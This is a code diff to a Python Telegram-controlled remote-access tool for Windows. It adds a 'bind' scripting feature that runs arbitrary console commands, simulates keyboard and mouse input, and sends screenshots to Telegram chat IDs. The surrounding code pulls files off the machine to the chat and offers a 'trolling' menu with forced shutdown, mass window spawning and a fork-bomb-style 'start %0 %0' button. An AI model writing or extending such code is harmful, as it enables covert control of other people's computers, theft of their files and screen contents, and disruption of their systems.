@@ -12,7 +12,10 @@ import configparser
 import winreg
 import keyboard
 import pygetwindow
+#import screen_brightness_control as sbc
 import platform
+import time
+
 
 from winreg import *
 from telebot import types
@@ -38,6 +41,7 @@ conn.request("GET", "/ip")
 #Для функций
 name = ""
 route = ""
+bindname = ""
 
 total_mem, used_mem, free_mem = shutil.disk_usage('.')
 gb = 10 ** 9
@@ -761,8 +765,8 @@ def download_file(message):
             elif str(route) == 'Назад':
                 return files(message)
 
-            photo = open(str(route), 'rb')
-            bot.send_document(message.chat.id, photo)
+            file = open(str(route), 'rb')
+            bot.send_document(message.chat.id, file)
             files(message)
 
         except:
@@ -1209,7 +1213,8 @@ def mainmenu(message):
         item3=types.KeyboardButton("Клавиши")
         item4=types.KeyboardButton("Троллинг")
         item5=types.KeyboardButton("SAMP функции")
-        item6=types.KeyboardButton("Особые функции")
+        item6=types.KeyboardButton("Меню биндов")
+        item7=types.KeyboardButton("Особые функции")
         markup.add(item0)
         markup.add(item1)
         markup.add(item2)
@@ -1217,6 +1222,7 @@ def mainmenu(message):
         markup.add(item4)
         markup.add(item5)
         markup.add(item6)
+        markup.add(item7)
         bot.send_message(message.chat.id, '*📌 Вы в главном меню!*', reply_markup=markup, parse_mode='Markdown')
         bot.register_next_step_handler(message, check_main)
 
@@ -1235,6 +1241,9 @@ def check_main(message):
 
         elif message.text.strip() == 'Клавиши':
             keyboard_menu(message)
+
+        elif message.text.strip() == 'Меню биндов':
+            bind_menu(message)
         
         elif message.text.strip() == 'Троллинг':
             packs(message)
@@ -1358,19 +1367,17 @@ def packs(message):
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
         markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
         item0=types.KeyboardButton("Выключение ПК")
-        item1=types.KeyboardButton("Открыть порно")
-        item2=types.KeyboardButton("Массовое открытие сайтов")
-        item3=types.KeyboardButton("Массовое открытие проводника")
-        item4=types.KeyboardButton("Массовое перемещение мышки")
-        item5=types.KeyboardButton("start %0 %0")
-        item6=types.KeyboardButton("Назад")
+        item1=types.KeyboardButton("Массовое открытие сайтов")
+        item2=types.KeyboardButton("Массовое открытие проводника")
+        item3=types.KeyboardButton("Массовое перемещение мышки")
+        item4=types.KeyboardButton("start %0 %0")
+        item5=types.KeyboardButton("Назад")
         markup.add(item0)
         markup.add(item1)
         markup.add(item2)
         markup.add(item3)
         markup.add(item4)
         markup.add(item5)
-        markup.add(item6)
 
         bot.send_message(message.chat.id, '👺 *Вы в меню троллинга!*', reply_markup=markup, parse_mode='Markdown')
         bot.register_next_step_handler(message, check_packs)
@@ -1383,12 +1390,6 @@ def check_packs(message):
             bot.send_message(message.chat.id, '☑️ *Вы успешно использовали функцию выключения ПК!*', parse_mode='Markdown')
             os.system('chcp 1251')
             os.system('shutdown /s /t 0')
-            packs(message)
-        
-        elif message.text.strip() == 'Открыть порно':
-            whatopen = 'http://xvideos.com'
-            webbrowser.open(str(whatopen), new=1)
-            bot.send_message(message.chat.id, '☑️ *Вы успешно использовали функцию открытия порно!*', parse_mode='Markdown')
             packs(message)
 
         elif message.text.strip() == '/start':
@@ -1537,6 +1538,186 @@ def full_delete_open(message):
             os.system("python C:\\temp\\DeleteFile.py")
             other_functions(message)
 
+
+
+#Бинд API
+class bindAPI:
+    def setWait(dur):
+        time.sleep(int(dur))
+
+    def setCursor(x, y):
+        pyautogui.moveTo(int(x), int(y))
+
+    def writeKeyboard(text):
+        keyboard.write(text, 0)
+
+    def useKeyboard(combo):
+        keyboard.send(combo)
+
+    def useConsole(cmd):
+        os.system(cmd)
+
+    def openSite(site):
+        webbrowser.open(site)
+
+    def sendScreenshot(sendId):
+        pyautogui.screenshot("screen.png")
+        bot.send_document(int(sendId), open("screen.png", 'rb'))
+
+    def sendMessage(sendId, text):
+        bot.send_message(int(sendId), text)
+
+
+
+def bind_menu(message):
+    get_chat_id = message.chat.id
+
+    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
+        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
+        item0=types.KeyboardButton("Использовать бинд")
+        item1=types.KeyboardButton("Удалить бинд")
+        item2=types.KeyboardButton("Назад")
+        markup.add(item0)
+        markup.add(item1)
+        markup.add(item2)
+
+        bot.send_message(message.chat.id, '😏 *Вы в меню использования биндов!*', reply_markup=markup, parse_mode='Markdown')
+        bot.register_next_step_handler(message, check_bind_menu)
+
+def check_bind_menu(message):
+    get_chat_id = message.chat.id
+
+    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
+        cmd = message.text.strip()
+
+        if cmd == '/start' or cmd == 'Назад':
+            mainmenu(message)
+
+        elif cmd == 'Удалить бинд':
+            bind_delete(message)
+
+        elif cmd == 'Использовать бинд':
+            choose_bind(message)
+
+        else:
+            bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
+            bind_menu(message)
+
+
+
+def bind_delete(message):
+    get_chat_id = message.chat.id
+
+    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
+        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
+        item0=types.KeyboardButton("Назад")
+        markup.add(item0)
+
+        bot.send_message(message.chat.id, '😏 *Вы в меню удаление биндов!\nВведите имя уже существующего бинда для его удаления*', reply_markup=markup, parse_mode='Markdown')
+        bot.register_next_step_handler(message, check_bind_del)
+
+def check_bind_del(message):
+    get_chat_id = message.chat.id
+
+    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
+        if message.text.strip == "/start":
+            return start(message)
+
+        elif message.text.strip == "Назад":
+            return bind_menu(message)
+
+        #////////////////////
+
+        if os.path.isfile(f"binds\\{message.text.strip()}.txt"):
+            bot.send_message(message.chat.id, f'🤨 *Удаляю {message.text.strip()}.txt!*', parse_mode='Markdown')
+            os.remove(f"binds\\{message.text.strip()}.txt")
+            return bind_menu(message)
+        
+        else:
+            bot.send_message(message.chat.id, '😮 *Данного бинда не существует!*', parse_mode='Markdown')
+            return bind_menu(message)
+
+
+def choose_bind(message):
+    get_chat_id = message.chat.id
+
+    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
+        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
+        item0=types.KeyboardButton("Назад")
+        markup.add(item0)
+
+        bot.send_message(message.chat.id, '😏 *Вы в меню открытия удаление биндов!\nВведите имя уже существующего бинда для его открытия*', reply_markup=markup, parse_mode='Markdown')
+        bot.register_next_step_handler(message, bind_read)
+
+
+def bind_read(message):
+    get_chat_id = message.chat.id
+
+    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
+        if message.text.strip == "/start":
+            return start(message)
+
+        elif message.text.strip == "Назад":
+            return bind_menu(message)
+
+        if os.path.isfile(f"binds\\{message.text.strip()}.txt"):
+            bot.send_message(message.chat.id, f'🤨 *Запускаю {message.text.strip()}.txt!*', parse_mode='Markdown')
+        
+        else:
+            bot.send_message(message.chat.id, '😮 *Данного бинда не существует!*', parse_mode='Markdown')
+            return bind_menu(message)
+
+        file = open(f"binds\\{message.text.strip()}.txt", "r", encoding='utf8')
+        text = file.read()
+        code = text.split("\n")
+
+        for i in code:
+            if i.startswith('//'):
+                continue
+
+            elif i.startswith('wait'):
+                info = i.split('=', maxsplit=1)
+                bindAPI.setWait(int(info[1]))
+
+            elif i.startswith('setCursor'):
+                info = i.split('=', maxsplit=1)
+                funcCode = info[1].split(',', maxsplit=1)
+                bindAPI.setCursor(int(funcCode[0]), int(funcCode[1]))
+
+            elif i.startswith('writeKeyboard'):
+                info = i.split('=', maxsplit=1)
+                bindAPI.writeKeyboard(info[1])
+
+            elif i.startswith('useKeyboard'):
+                info = i.split('=', maxsplit=1)
+                bindAPI.useKeyboard(info[1])
+
+            elif i.startswith('useConsole'):
+                info = i.split('=', maxsplit=1)
+                bindAPI.useConsole(info[1])
+
+            elif i.startswith('openSite'):
+                info = i.split('=', maxsplit=1)
+                bindAPI.openSite(info[1])
+
+            elif i.startswith('sendScreenshot'):
+                info = i.split('=', maxsplit=1)
+                bindAPI.sendScreenshot(int(info[1]))
+
+            elif i.startswith('sendMessage'):
+                info = i.split('=', maxsplit=1)
+                funcCode = info[1].split(',', maxsplit=1)
+                bindAPI.sendMessage(int(funcCode[0]), str(funcCode[1]))
+
+            elif (i == '' or None):
+                continue
+            
+            else:
+                print(f'Ошибка! Неизвестная функция:\n{i}')
+                continue
+
+        bot.send_message(message.chat.id, '☑️ *Бинд был успешно использован!*', parse_mode='Markdown')
+        return bind_menu(message)
 
 
 if __name__ == '__main__':
